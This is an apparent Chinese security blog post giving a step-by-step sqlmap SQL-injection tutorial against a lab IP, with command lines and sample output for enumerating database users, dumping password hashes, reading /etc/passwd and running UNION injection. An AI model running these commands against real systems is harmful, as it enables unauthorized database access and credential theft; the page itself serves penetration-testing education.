<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>SQLmap工具介绍及其使用 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-06-12T09:03:46.000Z" itemprop="datePublished">
          2012-06-12
      </time>
    
    
    | 
    <a href='/tag/SQLmap/'>SQLmap</a>
    
    
</span>
    <h1 class="post-title">SQLmap工具介绍及其使用</h1>
    <section class="post-content">
      <p>1、首先安装python2.5。   <br>2、然后进入sqlmap的目录，执行sqlmap </p>  <p>详细用法 </p>  <p>1、sqlmap -u 注入点   <br>2、sqlmap -g &quot;关键词“ //这是通过google搜索注入，现在还不可以，不知道是什么原因，可以直接修改为百度    <br>3、    <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 </p>  <p>[hh:mm:25] [INFO] testing if the url is stable, wait a few seconds   <br>[hh:mm:26] [INFO] url is stable    <br>[hh:mm:26] [INFO] testing if GET parameter ‘id’ is dynamic    <br>[hh:mm:26] [INFO] confirming that GET parameter ‘id’ is dynamic    <br>[hh:mm:26] [INFO] GET parameter ‘id’ is dynamic    <br>[hh:mm:26] [INFO] testing sql injection on GET parameter ‘id’    <br>[hh:mm:26] [INFO] testing numeric/unescaped injection on GET parameter    <br>‘id’    <br>[hh:mm:26] [INFO] confirming numeric/unescaped injection on GET    <br>parameter ‘id’    <br>[hh:mm:26] [INFO] GET parameter ‘id’ is numeric/unescaped injectable    <br>[hh:mm:26] [INFO] testing MySQL    <br>[hh:mm:26] [INFO] query: CONCAT(‘5’, ‘5’)    <br>[hh:mm:26] [INFO] retrieved: 55    <br>[hh:mm:26] [INFO] performed 20 queries in 0 seconds    <br>[hh:mm:26] [INFO] confirming MySQL    <br>[hh:mm:26] [INFO] query: LENGTH(‘5’)    <br>[hh:mm:26] [INFO] retrieved: 1    <br>[hh:mm:26] [INFO] performed 13 queries in 0 seconds    <br>[hh:mm:26] [INFO] query: SELECT 5 FROM information_schema.TABLES LIMIT    <br>0, 1    <br>[hh:mm:26] [INFO] retrieved: 5    <br>[hh:mm:26] [INFO] performed 13 queries in 0 seconds    <br>remote DBMS: MySQL &gt;= 5.0.0 </p>  <p>4、指定参数注入 </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1    <br>-p &quot;id&quot; </p>  <p>[hh:mm:17] [INFO] testing if the url is stable, wait a few seconds   <br>[hh:mm:18] [INFO] url is stable    <br>[hh:mm:18] [INFO] testing sql injection on parameter ‘id’    <br>[hh:mm:18] [INFO] testing numeric/unescaped injection on parameter    <br>‘id’    <br>[hh:mm:18] [INFO] confirming numeric/unescaped injection on    <br>parameter ‘id’    <br>[hh:mm:18] [INFO] parameter ‘id’ is numeric/unescaped injectable    <br>[…] </p>  <p>Or if you want to provide more than one parameter, for instance: </p>  <p>$ python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v    <br>1 -p &quot;cat,id&quot; </p>  <p>5、指定方法和post的数据   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php&quot;" target="_blank" rel="external">http://192.168.1.47/page.php&quot;</a> –method &quot;POST&quot; –    <br>data &quot;id=1&amp;cat=2&quot; </p>  <p>6、指定cookie,可以注入一些需要登录的地址   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –cookie    <br>&quot;COOKIE_VALUE&quot; </p>  <p>7、通过代理注入   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –proxy    <br>&quot;<a href="http://127.0.0.1:8118&quot;" target="_blank" rel="external">http://127.0.0.1:8118&quot;</a>    <br>8、指定关键词，也可以不指定。程序会根据返回结果的hash自动判断    <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –string    <br>&quot;STRING_ON_TRUE_PAGE&quot;    <br>9、指定数据，这样就不用猜测其他的数据库里。可以提高效率。    <br>–remote-dbms    <br>10、指纹判别数据库类型    <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 -f    <br>11、获取banner信息    <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -b </p>  <p>banner: ‘5.0.38-Ubuntu_0ubuntu1.1-log’ </p>  <p>12、获取当前数据库，当前用户，所有用户，密码，所有可用数据库。   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –    <br>current-db </p>  <p>current database: ‘testdb’ </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –users </p>  <p>database management system users [5]:   <br>[<em>] ‘debian-sys-maint’@’localhost’    <br>[</em>] ‘root’@’127.0.0.1’    <br>[<em>] ‘root’@’leboyer’    <br>[</em>] ‘root’@’localhost’    <br>[<em>] ‘testuser’@’localhost’ </em></p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –    <br>passwords </p>  <p>database management system users password hashes:   <br>[] debian-sys-maint [1]:    <br>password hash: <em>XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX    <br>[</em>] root [1]:    <br>password hash: <em>YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY    <br>[</em>] testuser [1]:    <br>password hash: <em>ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ </em></p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –dbs </p>  <p>available databases [3]:   <br>[] information_schema    <br>[<em>] mysql    <br>[</em>] testdb </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –tables    <br>-D &quot;information_schema&quot; </p>  <p>Database: information_schema   <br>[16 tables]    <br>+—————————————+    <br>| CHARACTER_SETS |    <br>| COLLATION_CHARACTER_SET_APPLICABILITY |    <br>| COLLATIONS |    <br>| COLUMN_PRIVILEGES |    <br>| COLUMNS |    <br>| KEY_COLUMN_USAGE |    <br>| ROUTINES |    <br>| SCHEMA_PRIVILEGES |    <br>| SCHEMATA |    <br>| STATISTICS |    <br>| TABLE_CONSTRAINTS |    <br>| TABLE_PRIVILEGES |    <br>| TABLES |    <br>| TRIGGERS |    <br>| USER_PRIVILEGES |    <br>| VIEWS |    <br>+—————————————+ </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –    <br>columns -T &quot;user&quot; -D &quot;mysql&quot; </p>  <p>Database: mysql   <br>Table: user    <br>[37 columns]    <br>+———————–+——+    <br>| Column | Type |    <br>+———————–+——+    <br>| Alter_priv | enum |    <br>| Alter_routine_priv | enum |    <br>| Create_priv | enum |    <br>| Create_routine_priv | enum |    <br>| Create_tmp_table_priv | enum |    <br>| Create_user_priv | enum |    <br>| Create_view_priv | enum |    <br>| Delete_priv | enum |    <br>| Drop_priv | enum |    <br>| Execute_priv | enum |    <br>| File_priv | enum |    <br>| Grant_priv | enum |    <br>| Host | char |    <br>| Index_priv | enum |    <br>| Insert_priv | enum |    <br>| Lock_tables_priv | enum |    <br>| max_connections | int |    <br>| max_questions | int |    <br>| max_updates | int |    <br>| max_user_connections | int |    <br>| Password | char |    <br>| Process_priv | enum |    <br>| References_priv | enum |    <br>| Reload_priv | enum |    <br>| Repl_client_priv | enum |    <br>| Repl_slave_priv | enum |    <br>| Select_priv | enum |    <br>| Show_db_priv | enum |    <br>| Show_view_priv | enum |    <br>| Shutdown_priv | enum |    <br>| ssl_cipher | blob |    <br>| ssl_type | enum |    <br>| Super_priv | enum |    <br>| Update_priv | enum |    <br>| User | char |    <br>| x509_issuer | blob |    <br>| x509_subject | blob |    <br>+———————–+——+ </p>  <p>13、显示指定的文件内容，一般用于php   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –file /    <br>etc/passwd </p>  <p>/etc/passwd:   <br>—    <br>root:x:0:0:root:/root:/bin/bash    <br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh    <br>bin:x:2:2:bin:/bin:/bin/sh    <br>sys:x:3:3:sys:/dev:/bin/sh    <br>sync:x:4:65534:sync:/bin:/bin/sync    <br>games:x:5:60:games:/usr/games:/bin/sh    <br>man:x:6:12:man:/var/cache/man:/bin/sh    <br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh    <br>mail:x:8:8:mail:/var/mail:/bin/sh    <br>news:x:9:9:news:/var/spool/news:/bin/sh    <br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh    <br>proxy:x:13:13:proxy:/bin:/bin/sh    <br>www-data:x:33:33:www-data:/var/www:/bin/false    <br>backup:x:34:34:backup:/var/backups:/bin/sh    <br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh    <br>mysql:x:104:105:MySQL Server,,,:/var/lib/mysql:/bin/false    <br>postgres:x:105:107:PostgreSQL administrator,,,:/var/lib/postgresql:/    <br>bin/bash    <br>inquis:x:1000:100:Bernardo Damele,,,:/home/inquis:/bin/bash    <br>— </p>  <p>14、执行你自己的sql语句。 </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 -e    <br>&quot;SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1&quot; </p>  <p>[hh:mm:18] [INFO] fetching expression output: ‘SELECT password FROM   <br>mysql.user WHERE user = ‘root’ LIMIT 0, 1’    <br>[hh:mm:18] [INFO] query: SELECT password FROM mysql.user WHERE user =    <br>‘root’ LIMIT 0, 1    <br>[hh:mm:18] [INFO] retrieved: YYYYYYYYYYYYYYYY    <br>[hh:mm:19] [INFO] performed 118 queries in 0 seconds    <br>SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1:    <br>‘YYYYYYYYYYYYYYYY’ </p>  <p>15、union注入   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> –union-    <br>check </p>  <p>valid union: ‘<a href="http://192.168.1.47/page.php?id=1" target="_blank" rel="external">http://192.168.1.47/page.php?id=1</a> UNION ALL SELECT    <br>NULL, NULL, NULL–&amp;cat=2’ </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 –    <br>union-use –banner </p>  <p>[…]   <br>[hh:mm:24] [INFO] testing inband sql injection on parameter ‘id’    <br>[hh:mm:24] [INFO] the target url could be affected by an inband sql    <br>injection vulnerability    <br>[hh:mm:24] [INFO] confirming inband sql injection on parameter ‘id’    <br>[…]    <br>[hh:mm:24] [INFO] fetching banner    <br>[hh:mm:24] [INFO] request: <a href="http://192.168.1.47/page.php?id=1" target="_blank" rel="external">http://192.168.1.47/page.php?id=1</a> UNION ALL    <br>SELECT CONCAT(CHAR(95,95,83,84,65,82,84,95,95), VERSION(),    <br>CHAR(95,95,83,84,79,80,95,95)), NULL, NULL–&amp;cat=2    <br>[hh:mm:24] [INFO] performed 1 queries in 0 seconds    <br>banner: ‘5.0.38-Ubuntu_0ubuntu1.1-log’ </p>  <p>16、保存注入过程到一个文件，还可以从文件恢复出注入过程，很方便，一大特色。你可以在注入的时候中断，有时间再继续。   <br>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 -b -    <br>o &quot;sqlmap.log&quot; </p>  <p>[…]   <br>[hh:mm:09] [INFO] fetching banner    <br>[hh:mm:09] [INFO] query: VERSION()    <br>[hh:mm:09] [INFO] retrieved: 5.0.30-Debian_3-log    <br>[hh:mm:11] [INFO] performed 139 queries in 1 seconds    <br>banner: ‘5.0.38-Ubuntu_0ubuntu1.1-log’ </p>  <p>python sqlmap.py -u &quot;<a href="http://192.168.1.47/page.php?id=1&amp;cat=2&quot;" target="_blank" rel="external">http://192.168.1.47/page.php?id=1&amp;cat=2&quot;</a> -v 1 –    <br>banner -o &quot;sqlmap.log&quot; –resume </p>  <p>[…]   <br>[hh:mm:13] [INFO] fetching banner    <br>[hh:mm:13] [INFO] query: VERSION()    <br>[hh:mm:13] [INFO] retrieved the length of query: 26    <br>[hh:mm:13] [INFO] resumed from file ‘sqlmap.log’: 5.0.45-Deb    <br>[hh:mm:13] [INFO] retrieved: ian_1ubuntu3-log    <br>banner:</p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://id.cker.in/458.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://id.cker.in/458.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://id.cker.in/458.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://id.cker.in/458.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/460.seo/">
        ← 一次超级蛋疼的渗透
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/455.seo/">
        Brup Suite应用分享之Web漏洞扫描 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
